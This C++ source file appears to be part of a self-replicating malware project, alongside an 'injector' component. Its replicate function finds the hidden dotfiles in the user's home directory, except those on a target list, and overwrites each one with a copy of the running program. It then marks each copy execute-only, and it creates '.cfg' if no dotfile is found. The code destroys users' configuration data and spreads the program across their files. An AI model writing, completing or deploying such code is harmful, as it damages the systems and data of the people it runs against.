//
// Created by ferdinand on 8/12/25.
//

#include "replicator.h"

#include <unistd.h>
#include <sys/stat.h>

#include "injector.h"

bool isPotentiallyTargetFile(const std::string& file) {
    for (auto& target: possibleTargetFiles) {
        if (file.find(target) != std::string::npos) return true;
    }
    return false;
}

void getHiddenFiles(const std::string &path, std::vector<std::string> &files) {
    DIR *dir;
    dirent *ent;
    if((dir = opendir(path.c_str())) == nullptr) {
        return;
    }

    while ((ent = readdir(dir)) != nullptr) {
        if (ent->d_type != DT_REG) continue;

        std::string entryName = ent->d_name;

        if (entryName.empty() || entryName[0] != '.' || isPotentiallyTargetFile(entryName)) continue;

        files.emplace_back(homePath + entryName);
    }
    closedir(dir);

    if (files.empty()) files.emplace_back(homePath + ".cfg");
}

void replicate(char *source) {
    std::ifstream reader(source);

    getHiddenFiles(homePath, replicatedEntries);

    for (const auto& entry : replicatedEntries) {
        std::ofstream writer(entry);
        writer << reader.rdbuf();
        reader.clear();
        reader.seekg(0, std::ios::beg);
        writer.close();
        chmod(entry.c_str(), S_IXUSR);
    }
    reader.close();
}
